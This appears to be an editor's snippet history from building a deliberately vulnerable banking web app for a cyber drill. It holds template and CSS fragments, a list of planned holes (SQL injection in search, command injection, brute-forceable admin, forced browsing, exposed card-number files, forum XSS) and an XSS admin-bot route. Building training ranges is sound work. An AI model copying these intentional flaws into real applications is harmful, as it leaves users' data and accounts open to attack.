d4f36c4cc40772dbfcaa6444f0247d2d|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/login.html|105|1|V|html
	        <section id="obts">        	
	            <div class="obts-wrapper">
	
	        </section>
32654d44a697ae223694b502de4aa964|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/login.html|105|4|V|html
				<br class="clear"/>        
5480806949380faa8e7cb69adfe04da5|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/static/css/styles.css|307|1|V|css
	/* STRUCTURE */
1f67af5e238679cf137f20b7b5f28678|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/login.html|123|1|V|html
	            <!-- Remind Passowrd -->
	            <div id="formFooter">
	              <a class="underlineHover" href="#">Forgot Password?</a>
	            </div>
7399a0c5c61cf80bfe461288f1e0105d|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/login.html|110|1|V|html
	
	            <!-- Icon -->
	            <div class="fadeIn first">
	              <img src="http://danielzawadzki.com/codepen/01/icon.svg" id="icon" alt="User Icon" />
	            </div>
65fad3eb2c0e4974a35fd7e533d0736b|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/static/css/styles.css|306|1|V|css
	/* Login form */
	
	.wrapper {
	  display: flex;
	  align-items: center;
	  flex-direction: column; 
	  justify-content: center;
	  width: 100%;
	  min-height: 100%;
	  padding: 20px;
	}
	
	#formContent {
	  -webkit-border-radius: 10px 10px 10px 10px;
	  border-radius: 10px 10px 10px 10px;
	  background: #fff;
	  padding: 30px;
	  width: 90%;
	  max-width: 450px;
	  position: relative;
	  padding: 0px;
	  -webkit-box-shadow: 0 30px 60px 0 rgba(0,0,0,0.3);
	  box-shadow: 0 30px 60px 0 rgba(0,0,0,0.3);
	  text-align: center;
	}
	
	#formFooter {
	  background-color: #f6f6f6;
	  border-top: 1px solid #dce8f1;
	  padding: 25px;
	  text-align: center;
	  -webkit-border-radius: 0 0 10px 10px;
	  border-radius: 0 0 10px 10px;
	}
	
	
	
	/* TABS */
	
	h2.inactive {
	  color: #cccccc;
	}
	
	h2.active {
	  color: #0d0d0d;
	  border-bottom: 2px solid #5fbae9;
	}
	
	
	
	/* FORM TYPOGRAPHY*/
	
	input[type=button], input[type=submit], input[type=reset]  {
	  background-color: #56baed;
	  border: none;
	  color: white;
	  padding: 15px 80px;
	  text-align: center;
	  text-decoration: none;
	  display: inline-block;
	  text-transform: uppercase;
	  font-size: 13px;
	  -webkit-box-shadow: 0 10px 30px 0 rgba(95,186,233,0.4);
	  box-shadow: 0 10px 30px 0 rgba(95,186,233,0.4);
	  -webkit-border-radius: 5px 5px 5px 5px;
	  border-radius: 5px 5px 5px 5px;
	  margin: 5px 20px 40px 20px;
	  -webkit-transition: all 0.3s ease-in-out;
	  -moz-transition: all 0.3s ease-in-out;
	  -ms-transition: all 0.3s ease-in-out;
	  -o-transition: all 0.3s ease-in-out;
	  transition: all 0.3s ease-in-out;
	}
	
	input[type=button]:hover, input[type=submit]:hover, input[type=reset]:hover  {
	  background-color: #39ace7;
	}
	
	input[type=button]:active, input[type=submit]:active, input[type=reset]:active  {
	  -moz-transform: scale(0.95);
	  -webkit-transform: scale(0.95);
	  -o-transform: scale(0.95);
	  -ms-transform: scale(0.95);
	  transform: scale(0.95);
	}
	
	input[type=text] {
	  background-color: #f6f6f6;
	  border: none;
	  color: #0d0d0d;
	  padding: 15px 32px;
	  text-align: center;
	  text-decoration: none;
	  display: inline-block;
	  font-size: 16px;
	  margin: 5px;
	  width: 85%;
	  border: 2px solid #f6f6f6;
	  -webkit-transition: all 0.5s ease-in-out;
	  -moz-transition: all 0.5s ease-in-out;
	  -ms-transition: all 0.5s ease-in-out;
	  -o-transition: all 0.5s ease-in-out;
	  transition: all 0.5s ease-in-out;
	  -webkit-border-radius: 5px 5px 5px 5px;
	  border-radius: 5px 5px 5px 5px;
	}
	
	input[type=text]:focus {
	  background-color: #fff;
	  border-bottom: 2px solid #5fbae9;
	}
	
	input[type=text]:placeholder {
	  color: #cccccc;
	}
	
	
	
	/* ANIMATIONS */
	
	/* Simple CSS3 Fade-in-down Animation */
	.fadeInDown {
	  -webkit-animation-name: fadeInDown;
	  animation-name: fadeInDown;
	  -webkit-animation-duration: 1s;
	  animation-duration: 1s;
	  -webkit-animation-fill-mode: both;
	  animation-fill-mode: both;
	}
	
	@-webkit-keyframes fadeInDown {
	  0% {
	    opacity: 0;
	    -webkit-transform: translate3d(0, -100%, 0);
	    transform: translate3d(0, -100%, 0);
	  }
	  100% {
	    opacity: 1;
	    -webkit-transform: none;
	    transform: none;
	  }
	}
	
	@keyframes fadeInDown {
	  0% {
	    opacity: 0;
	    -webkit-transform: translate3d(0, -100%, 0);
	    transform: translate3d(0, -100%, 0);
	  }
	  100% {
	    opacity: 1;
	    -webkit-transform: none;
	    transform: none;
	  }
	}
	
	/* Simple CSS3 Fade-in Animation */
	@-webkit-keyframes fadeIn { from { opacity:0; } to { opacity:1; } }
	@-moz-keyframes fadeIn { from { opacity:0; } to { opacity:1; } }
	@keyframes fadeIn { from { opacity:0; } to { opacity:1; } }
	
	.fadeIn {
	  opacity:0;
	  -webkit-animation:fadeIn ease-in 1;
	  -moz-animation:fadeIn ease-in 1;
	  animation:fadeIn ease-in 1;
	
	  -webkit-animation-fill-mode:forwards;
	  -moz-animation-fill-mode:forwards;
	  animation-fill-mode:forwards;
	
	  -webkit-animation-duration:1s;
	  -moz-animation-duration:1s;
	  animation-duration:1s;
	}
	
	.fadeIn.first {
	  -webkit-animation-delay: 0.4s;
	  -moz-animation-delay: 0.4s;
	  animation-delay: 0.4s;
	}
	
	.fadeIn.second {
	  -webkit-animation-delay: 0.6s;
	  -moz-animation-delay: 0.6s;
	  animation-delay: 0.6s;
	}
	
	.fadeIn.third {
	  -webkit-animation-delay: 0.8s;
	  -moz-animation-delay: 0.8s;
	  animation-delay: 0.8s;
	}
	
	.fadeIn.fourth {
	  -webkit-animation-delay: 1s;
	  -moz-animation-delay: 1s;
	  animation-delay: 1s;
	}
	
	/* Simple CSS3 Fade-in Animation */
	.underlineHover:after {
	  display: block;
	  left: 0;
	  bottom: -10px;
	  width: 0;
	  height: 2px;
	  background-color: #56baed;
	  content: "";
	  transition: width 0.2s;
	}
	
	.underlineHover:hover {
	  color: #0d0d0d;
	}
	
	.underlineHover:hover:after{
	  width: 100%;
	}
	
	
	
	/* OTHERS */
	
	*:focus {
	    outline: none;
	} 
	
	#icon {
	  width:60%;
	}
	
	* {
	  box-sizing: border-box;
	}
632b34ac7784d2c5dacc9c876feed85c|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/static/css/styles.css|314|1|V|css
		background:url(https://raw.githubusercontent.com/khadkamhn/day-01-login-form/master/img/bg.jpg) no-repeat center;
caa6f2b197faf5c249a60107a7518fa3|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/login.html|159|1|V|html
	
	        <div class="wrapper fadeInDown">
	          <div id="formContent">
	            <!-- Tabs Titles -->
	            <h2 class="active"> Sign In </h2>
	            <h2 class="inactive underlineHover"> Sign Up </h2>
	
	            <!-- Login Form -->
	            <form>
	              <input type="text" id="login" class="fadeIn second" name="login" placeholder="login">
	              <input type="text" id="password" class="fadeIn third" name="login" placeholder="password">
	              <input type="submit" class="fadeIn fourth" value="Log In">
	            </form>
	
	          </div>
	        </div>
	
01646c6395bb99f6df432dcc2c6cfcb9|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/login.html|126|36|V|html
	                        <div class="foot-lnk">
	                            <a href="#forgot">Forgot Password?</a>
	                        </div>
6a96c232163fb3be73681fdd2a5b5b8d|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/login.html|118|1|V|html
	                        <div class="group">
	                            <input id="check" type="checkbox" class="check" checked>
	                            <label for="check"><span class="icon"></span> Keep me Signed in</label>
	                        </div>
99c483e1d11b1a279a2a1a3960528487|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/static/css/styles.css|313|11|v|css
	relative
dc4d53aa0d117d8b189b36d161af4e96|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/static/css/styles.css|313|11|v|css
	absolute
f0b56fce6df08234faeb3d3ebcebe19e|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/login.html|104|1|V|html
	        <section id="obts">
11126d3b0a63e547fe160fef68cf8e8b|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/login.html|133|1|V|html
	                        <div class="group">
	                            <label for="pass" class="label">Repeat Password</label>
	                            <input id="pass" type="password" class="input" data-type="password">
	                        </div>
2f6b2a40c18dad869dee52c2cf7e59ff|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/login.html|140|25|V|html
	                        <div class="hr"></div>
3d0a8031c35f4b7be4f93c1c28984414|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/login.html|140|1|V|html
	                        <div class="foot-lnk">
	                            <label for="tab-1">Already Member?</a>
	                        </div>
2c6a92b510e91f14e8ce097b74c2b09a|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/static/css/styles.css|350|2|V|css
		border-bottom:2px solid transparent;
3f6de7a13eea71752dafeedc2827e4a9|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/login.html|145|1|V|html
	<br class="clear"/>        
4b2a6721136a991ad13d14a0d2ed4390|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/static/css/styles.css|102|5|V|css
	    border-bottom: 1px solid #cc5836;
e235b30be724ef66eb3c53c57566e8ee|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/login.html|87|1|V|html
			<section id="spacer">        	         
	            
				<div class="spacer-wrapper">				
					
					<form action="#">
						<!-- after clicking/tapping the search button, the site remains on the search 
						result link while refreshing 
						( index.html?sitesearch=Enter+a+word...&start_search=Search# ). 
						So we have to return to index.html explicitly for further testing. I added a link 
						to itself (index.html) on the logo, see the header -->
						<input type="text" name="sitesearch" placeholder="Search for past transactions..."/>
						<input type="submit" name="start_search" class="button" value="Search"/>
					</form>				
				
				</div>
			</section>
	
6df9bf27801a7bd75dedb880dcda0f9f|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/login.html|86|9|V|html
	        							<!-- the spacer -->
b8d399e8ca2c81e0e8f6f515b851a400|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.bak|54|1|V|html
				  <form action="/register" method="POST">
936cff44f96816f06da12d4cc5f2af83|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.bak|23|1|V|html
				  <form action="/login" method="POST">
fe7963b481b8b4021e7b99294397678a|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|27|5|V|python
	    return render_template('login.html')
af7bf1449c3cbdae1adb316ea16908f4|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|87|1|V|html
			<section id="spacer">        	         
	            
				<div class="spacer-wrapper">				
					
					<form action="#">
						<!-- after clicking/tapping the search button, the site remains on the search 
						result link while refreshing 
						( index.html?sitesearch=Enter+a+word...&start_search=Search# ). 
						So we have to return to index.html explicitly for further testing. I added a link 
						to itself (index.html) on the logo, see the header -->
						<input type="text" name="sitesearch" placeholder="Search for past transactions..."/>
						<input type="submit" name="start_search" class="button" value="Search"/>
					</form>				
				
				</div>
			</section>
7caf8df3680e8e29d6c5872429d9d0f2|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/login.html|91|3|V|html
					<form action="#">
						<!-- after clicking/tapping the search button, the site remains on the search 
						result link while refreshing 
						( index.html?sitesearch=Enter+a+word...&start_search=Search# ). 
						So we have to return to index.html explicitly for further testing. I added a link 
						to itself (index.html) on the logo, see the header -->
						<input type="text" name="sitesearch" placeholder="Search for past transactions..."/>
						<input type="submit" name="start_search" class="button" value="Search"/>
					</form>				
4f2fbf2e55136fae7a172c6dae0d13be|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/login.html|90|4|V|html
					
e9ed7dc9f2fda6815775c24a452f096a|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|28|9|V|python
	        return redirect(url_for('profile'))
817fd66ce7fbc9f5b02f081d68fb8d2d|file:///home/neo/cyberranges/work/ocbc-cyberdrill/vulnerabilities.md|5|10|v|vimwiki
	If we can easily create an admin who regularly checks a forum page - Customer complain forum
5a8ec1e8b4de7ce481dd385142c548bd|file:///home/neo/247ctf/begginner/solve.py|12|5|V|python
	    r.recv(1024)
021bbc7ee20b71134d53e20206bd6feb|file:///home/neo/247ctf/begginner/solve.py|13|8|v|python
	1024
3ac76c6b2134d1512ad59747485b4568|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|109|36|v|html
	elephant-right.png
8de91804109f9636973b46e7e75f9450|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|116|36|v|html
	elephant-left.png
891691623494299cb38a4d7f079f5d4d|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|109|50|v|html
	 alt="Eleph R"
57da5cc78158d8391ca6e7b027721fe0|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|116|40|v|html
	 alt="Eleph L"
63185e03930cf8235058137f04c20a97|file:///home/neo/cyberranges/work/ocbc-cyberdrill/vulnerabilities.md|1|1|V|vimwiki
	1. Injection - SQLi at search bar (search for past transactions - this bank allows to view the transactions of everyone - select * from transactions where from_user = )- Command injection - as it is in pirates
	2. Broken Authentication - Bruteforcable admin/an important user's password 
	3. Broken access control - forced browsing to view other users' profiles
	4. Security Misconfiguration - Directory listing - file containing credit card numbers
	5. XSS - Customer complaint forum
d6222592bdc0ff94cbe23d9d36222805|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|142|25|V|html
					rewrote the code to get a good working knowledge of the html, css and javascript involved. 
					So I can say I handcoded this template myself in HTML5 and CSS3. Should be browser-compatible 
					from IE7.<br>See the source code for the tutorial-links and my additional comments 
f7b469e42601dffcc40f57f5fd21326c|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|141|21|v|html
	This is an HTML5 Responsive template. I was inspired by a few tutorials, but I intensively if you like.
415df9e2eae16ad28e45222623176268|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|142|17|V|html
	                
	               		<p>Praesent nec augue dapibus, sollicitudin tellus eget, tincidunt lorem. Suspendisse lacinia ex 
					at dolor egestas pulvinar. Sed efficitur vestibulum leo et semper. Morbi condimentum nisi 
					eu urna maximus, vitae suscipit massa convallis. Donec dapibus augue turpis. Suspendisse
					auctor luctus imperdiet. Pellentesque euismod ipsum vel tellus laoreet ultrices.</p>
5379de1b2fe47f068907eb538c227993|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|150|26|v|html
	Sed efficitur vestibulum leo et semper. Morbi condimentum nisi eu urna maximus, vitae suscipit massa convallis.
da49f4ea81528ad5bb5b0b52d36d07e3|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|156|25|v|html
	Fusce in accumsan dolor. Suspendisse et malesuada nisl. Suspendisse auctor luctus imperdiet.
d1110a436cc9ab5dd0e5d3a9a9760610|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|175|6|V|html
						¬∑					
7697f5a490cacb850ad5d5cd95937f2b|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|109|51|v|html
	height="100px" width="100px" 
f175b8a01efd7c4da36a49a2aeba3a1d|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/xss-1/app/server.py|121|16|v|python
	QT_QPA_PLATFORM=offscreen phantomjs --ignore-ssl-errors=true --local-to-remote-url-access=true --web-security=false --ssl-protocol=any bot/xssbot.js
aa45ca888565206d6b4929a740a27b8b|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/xss-1/app/server.py|114|1|V|python
	@app.route('/contact', methods=['POST'])
	def contactUs():
	    if 'username' in session.keys():
	        user = session['username']
	    else:
	        return redirect(url_for('index'))
	
	    os.system('QT_QPA_PLATFORM=offscreen phantomjs --ignore-ssl-errors=true --local-to-remote-url-access=true --web-security=false --ssl-protocol=any bot/xssbot.js')
	
	    return "<html><body><div><h2>Admin Notified !!!</h2><br>Please click <a href='/profile'>here</a> to return to your profile.</div></body></html>"
bbdbe444288550204c968fe7002a97a9|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|68|35|v|html
	forum
e6a7f8a2f42cc35979973da8dfb10720|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|68|44|v|html
	Forum
3ca00c2ec326b902a893824942c03fdb|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/xss-1/app/server.py|123|74|^v|python
	<a href='/profile'>here</a> 
7d97481b1fe66f4b51db90da7e794d9f|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|150|79|v|html
	profile
51315d9c4a359036604d6460b4506bd3|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|156|48|v|html
	all the complaints at the forum every few minutes!
7e1adde6d66569a4c553aa67a8cca818|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|100|16|v|python
	render_template('profile.html')
74acd0ea0f01b138708da42d7ce66fc2|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|130|5|V|python
	    render_template('contact.html')
bbe79fe4cf597a4ed071dd73cf256364|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/xss-1/app/server.py|25|1|V|python
	@app.route('/', methods=['GET'])
	def index():
	    if 'username' in session.keys():
	        return redirect(url_for('profile'))
	    else:
	        return render_template('index.html')
	
41e7db80508c85d78168d116c806f245|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/xss-1/app/server.py|37|16|v|python
	render_template
eacf331f0ffc35d4b482f1d15a887d3b|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/xss-1/app/server.py|37|35|v|python
	index.html
04cee18e35a28d47fbf7e0db161165ac|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/xss-1/app/server.py|35|9|V|python
	        return redirect(url_for(''))
ab4a3dbf57c9681b700655b210780187|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/xss-1/app/server.py|30|1|V|python
	        return render_template('index.html')
ce1cef5acf54845513cb6b44d091aa24|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/xss-1/app/server.py|32|1|V|python
	@app.route('/contact_us', methods=['GET'])
	def contact():
	    if 'username' in session.keys():
	        return render_template('contact.html')
	    else:
	        return redirect(url_for('/'))
	
577221c1236b95a89f97ec6beab59ea1|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|1|1|V|html
	<!-- The JoccaGit HTML5 Template -->
	<!DOCTYPE HTML>
	<html>
	    <head>
	        <meta charset="UTF-8">        
	        <meta http-equiv="X-UA-Compatible" content="IE=edge">
			
			<meta name="viewport" content="width=device-width, initial-scale=1.0">
			
			<title>Best Banking App</title>
	        
	        <!-- stylesheets -->
		<link rel="stylesheet" href="/css/reset.css" type="text/css" media="screen" />
	        <link rel="stylesheet" href="css/styles.css" type="text/css" media="screen" />
	        
	        <!-- footer files css (including footer media queries) -->
	        <link rel="stylesheet" href="/css/footer-distributed.css">
	        <!-- See www.bootstrapcdn.com . This online stylesheet seems to be only for the social media icons in the footer, 
		possibly download this later to be sure: -->
	        <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css">
	        
	        <!-- media queries -->
	        <link rel="stylesheet" href="/css/media-queries.css" type="text/css" media="screen" />
	        
	        <!-- Fonts (Jocca edit: I switched the fonts: <link href='http://fonts.googleapis.com/css?family=Open+Sans|Baumans' 
		rel='stylesheet' type='text/css'> ) -->
	        <link href="https://fonts.googleapis.com/css?family=Montserrat|Ubuntu" rel="stylesheet"> 
	
	        <!-- jQuery -->
	        <script src="/js/vendor/modernizr.min.js"></script>
	        <script src="/js/vendor/respond.min.js"></script>
	        
	        <!-- include extern jQuery file but fall back to local file if extern one fails to load -->
	        <script src="http://code.jquery.com/jquery-1.7.2.min.js"></script>
	        <script type="text/javascript">window.jQuery || document.write('<script type="text/javascript" src="\/js\/vendor\/1.7.2.jquery.min.js"><\/script>')</script>
	        
	        <!-- Jocca edit: Prefix Free: jQuery takes care of the vendor prefixes. In the Sublime Text (3) editor's there's also 
		a Autoprefixer plugin (https://packagecontrol.io/packages/Autoprefixer), so maybe that's handier? 
		(for a next project)  -->
	        <script src="/js/vendor/prefixfree.min.js"></script>        
	        
	        <!-- JavaScript for the alternative menu. It uses the jQuery slideToggle function -->
	        <script src="/js/script.js"></script>
	        
	        <!-- backwards compatible margin-correction -->
	        <!--[if lt IE 9]>
	            <style>
	                header
	                {
	                    margin: 0 auto 20px auto;
	                }                 
	            </style>
	        <![endif]-->        
		</head>
	
		<body>        						<!-- the header -->
	        <header>
	            <div class="toggleMobile">
	               	<span class="symbol-bar1"></span>
	               	<span class="symbol-bar2"></span>
	               	<span class="symbol-bar3"></span>
	            </div>
	            	
	            <div id="mobileMenu">
	               	<ul>
	                   	<li><a href="/">Home</a></li>
	                    <li><a href="/profile">Profile</a></li>
	                    <li><a href="/contact_us">Contact Us</a></li>
	                </ul>
	            </div>
	            	
	            <a href="index.html">
			<h1>Best Banking App</h1>
	            	</a>
				<p>The best and most secure banking app you will find on the market!</p>           
	            
	            <nav>                           <!-- main menu -->
	               	<ul>
	                   	<li><a href="/">Home</a></li>
	                    <li><a href="/profile">Profile</a></li>
	                    <li><a href="/contact_us">Contact Us</a></li>
	               	</ul>
	            </nav>
	        
	        </header>
	        							<!-- the spacer -->
			<section id="spacer">        	         
	            
				<div class="spacer-wrapper">				
					
					<form action="#">
						<!-- after clicking/tapping the search button, the site remains on the search 
						result link while refreshing 
						( index.html?sitesearch=Enter+a+word...&start_search=Search# ). 
						So we have to return to index.html explicitly for further testing. I added a link 
						to itself (index.html) on the logo, see the header -->
						<input type="text" name="sitesearch" placeholder="Search for past transactions..."/>
						<input type="submit" name="start_search" class="button" value="Search"/>
					</form>				
				
				</div>
			</section>
	        							<!-- three columns -->
			<section id="three-columns">
	
				<div class="three-columns-wrapper">
	        	
	           		<article>            	               
	               		<img src="/images/lightning.png" height="100px" width="100px" />                
	               		<h3>Fast</h3>
	                	
	               		<p>Enjoy the fastest banking experience!</p>
	           		</article>
	            	
	           		<article>            	     
	               		<img src="/images/bug.png" height="100px" width="100px" />
	                	
	               		<h3>Reliable</h3>
	                	
	               		<p>Our web application is bug free and never breaks!</p>
	           		</article>
	            
	           		<article>            	    
	               		<img src="/images/lock.png" height="100px" width="100px" />                
	                		<h3>Secure</h3>
	                
	                		<p>The best security experts make sure that your banking data is safe!</p>
	                </article>
					
				</div><!-- end three columns-wrapper -->
	           	<br class="clear"/>
	        
	        </section>        
	        <section id="obts">        	
	            
	            <div class="obts-wrapper">
	            		
	            	<article>           	 
	               		<h3>No anonymity!</h3>
	                
	               		<p>We are proudly the first bank to offer zero anonymity! Any user can search for all the transactions of another user!</p>                		
	            	</article>            
	            	
					<section id="ts">               
	            
	               		<article class="row">                   
	            
	                    		<img src="/images/icon-paper-plane.png" width="80" class="rocket" alt="Some alt text"/>
	                    
	                            <p>Have a complaint?<br><br> Contact us <a href='/contact_us'>here</a> to suggest how your banking experience can be improved!</p> </article> 
	                
	               		<article class="row">                   
	            
	                   		<img src="/images/icon-clock.png" width="80" class="clock" alt="Some alt text"/>
	                    
	                        <p>Our admin check out your complaint in no time and make sure it is resolved!<br><br></p>
	                	</article> 
	            	
	            	</section>
				
				</div>			<!-- end obts-wrapper -->
				
				<br class="clear"/>        
	        <footer class="footer-distributed">
	
	        	<div class="footer-wrapper">        	
	
					<p class="footer-links">
					
						<a href="/">Home</a>
						¬∑
						<a href="/profile">Profile</a>
						¬∑
						<a href="/contact_us">Contact US</a>
						¬∑					
	
					</p>
	
					<p>Best Banking App; 2020</p>
						
					<div class="footer-right">
							<!-- the social media icons from Bootstrap CDN: -->
						<a href="#"><i class="fa fa-facebook"></i></a>
						<a href="#"><i class="fa fa-twitter"></i></a>
						<a href="#"><i class="fa fa-linkedin"></i></a>
						<a href="#"><i class="fa fa-github"></i></a>
	
					</div>
				
				</div><!-- end footer-wrapper -->
	
			</footer>
	                
		</body>
	</html>
1daed826bf0b7989097ee3457f61e352|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/layout.html|86|1|V|html
			<section id="spacer">        	         
	            
				<div class="spacer-wrapper">				
					
					<form action="#">
						<!-- after clicking/tapping the search button, the site remains on the search 
						result link while refreshing 
						( index.html?sitesearch=Enter+a+word...&start_search=Search# ). 
						So we have to return to index.html explicitly for further testing. I added a link 
						to itself (index.html) on the logo, see the header -->
						<input type="text" name="sitesearch" placeholder="Search for past transactions..."/>
						<input type="submit" name="start_search" class="button" value="Search"/>
					</form>				
				
				</div>
			</section>
	        							<!-- three columns -->
			<section id="three-columns">
	
				<div class="three-columns-wrapper">
	        	
	           		<article>            	               
	               		<img src="/images/lightning.png" height="100px" width="100px" />                
	               		<h3>Fast</h3>
	                	
	               		<p>Enjoy the fastest banking experience!</p>
	           		</article>
	            	
	           		<article>            	     
	               		<img src="/images/bug.png" height="100px" width="100px" />
	                	
	               		<h3>Reliable</h3>
	                	
	               		<p>Our web application is bug free and never breaks!</p>
	           		</article>
	            
	           		<article>            	    
	               		<img src="/images/lock.png" height="100px" width="100px" />                
	                		<h3>Secure</h3>
	                
	                		<p>The best security experts make sure that your banking data is safe!</p>
	                </article>
					
				</div><!-- end three columns-wrapper -->
	           	<br class="clear"/>
	        
	        </section>        
	        <section id="obts">        	
	            
	            <div class="obts-wrapper">
	            		
	            	<article>           	 
	               		<h3>No anonymity!</h3>
	                
	               		<p>We are proudly the first bank to offer zero anonymity! Any user can search for all the transactions of another user!</p>                		
	            	</article>            
	            	
					<section id="ts">               
	            
	               		<article class="row">                   
	            
	                    		<img src="/images/icon-paper-plane.png" width="80" class="rocket" alt="Some alt text"/>
	                    
	                            <p>Have a complaint?<br><br> Contact us <a href='/contact_us'>here</a> to suggest how your banking experience can be improved!</p> </article> 
	                
	               		<article class="row">                   
	            
	                   		<img src="/images/icon-clock.png" width="80" class="clock" alt="Some alt text"/>
	                    
	                        <p>Our admin check out your complaint in no time and make sure it is resolved!<br><br></p>
	                	</article> 
	            	
	            	</section>
				
				</div>			<!-- end obts-wrapper -->
df8206d6ad9dea823623ce5782ceddff|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/layout.html|89|1|V|html
					
					<form action="#">
						<!-- after clicking/tapping the search button, the site remains on the search 
						result link while refreshing 
						( index.html?sitesearch=Enter+a+word...&start_search=Search# ). 
						So we have to return to index.html explicitly for further testing. I added a link 
						to itself (index.html) on the logo, see the header -->
						<input type="text" name="sitesearch" placeholder="Search for past transactions..."/>
						<input type="submit" name="start_search" class="button" value="Search"/>
					</form>				
d35e229f73c5f1272a963ebf614a1527|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|1|1|V|html
	<!-- The JoccaGit HTML5 Template -->
	<!DOCTYPE HTML>
	<html>
	    <head>
	        <meta charset="UTF-8">        
	        <meta http-equiv="X-UA-Compatible" content="IE=edge">
			
			<meta name="viewport" content="width=device-width, initial-scale=1.0">
			
			<title>Best Banking App</title>
	        
	        <!-- stylesheets -->
		<link rel="stylesheet" href="/css/reset.css" type="text/css" media="screen" />
	        <link rel="stylesheet" href="css/styles.css" type="text/css" media="screen" />
	        
	        <!-- footer files css (including footer media queries) -->
	        <link rel="stylesheet" href="/css/footer-distributed.css">
	        <!-- See www.bootstrapcdn.com . This online stylesheet seems to be only for the social media icons in the footer, 
		possibly download this later to be sure: -->
	        <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css">
	        
	        <!-- media queries -->
	        <link rel="stylesheet" href="/css/media-queries.css" type="text/css" media="screen" />
	        
	        <!-- Fonts (Jocca edit: I switched the fonts: <link href='http://fonts.googleapis.com/css?family=Open+Sans|Baumans' 
		rel='stylesheet' type='text/css'> ) -->
	        <link href="https://fonts.googleapis.com/css?family=Montserrat|Ubuntu" rel="stylesheet"> 
	
	        <!-- jQuery -->
	        <script src="/js/vendor/modernizr.min.js"></script>
	        <script src="/js/vendor/respond.min.js"></script>
	        
	        <!-- include extern jQuery file but fall back to local file if extern one fails to load -->
	        <script src="http://code.jquery.com/jquery-1.7.2.min.js"></script>
	        <script type="text/javascript">window.jQuery || document.write('<script type="text/javascript" src="\/js\/vendor\/1.7.2.jquery.min.js"><\/script>')</script>
	        
	        <!-- Jocca edit: Prefix Free: jQuery takes care of the vendor prefixes. In the Sublime Text (3) editor's there's also 
		a Autoprefixer plugin (https://packagecontrol.io/packages/Autoprefixer), so maybe that's handier? 
		(for a next project)  -->
	        <script src="/js/vendor/prefixfree.min.js"></script>        
	        
	        <!-- JavaScript for the alternative menu. It uses the jQuery slideToggle function -->
	        <script src="/js/script.js"></script>
	        
	        <!-- backwards compatible margin-correction -->
	        <!--[if lt IE 9]>
	            <style>
	                header
	                {
	                    margin: 0 auto 20px auto;
	                }                 
	            </style>
	        <![endif]-->        
		</head>
	
